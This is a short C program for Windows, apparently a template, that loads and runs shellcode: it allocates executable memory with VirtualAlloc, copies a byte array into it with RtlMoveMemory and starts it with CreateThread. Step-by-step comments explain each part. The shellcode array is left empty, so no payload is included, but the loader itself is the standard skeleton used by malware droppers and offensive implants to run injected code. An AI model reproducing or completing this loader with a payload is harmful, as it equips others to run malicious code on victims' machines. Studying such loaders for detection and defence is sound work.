#include <windows.h> // header file for windows API
#include <stdio.h>

int main()
{
    char shellcode[] = {};
    int shellcode_size = sizeof(shellcode);
    void *exec_mem; // allocated Memory

    exec_mem = VirtualAlloc(NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); // Allocate memory in a specific region 
    RtlMoveMemory(exec_mem, shellcode, shellcode_size); // move the shellcode to the allocated memory region
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL); // create a thread and execute code, points to the memory location created using virtualAlloc
    Sleep(1000);
    return 0;
}
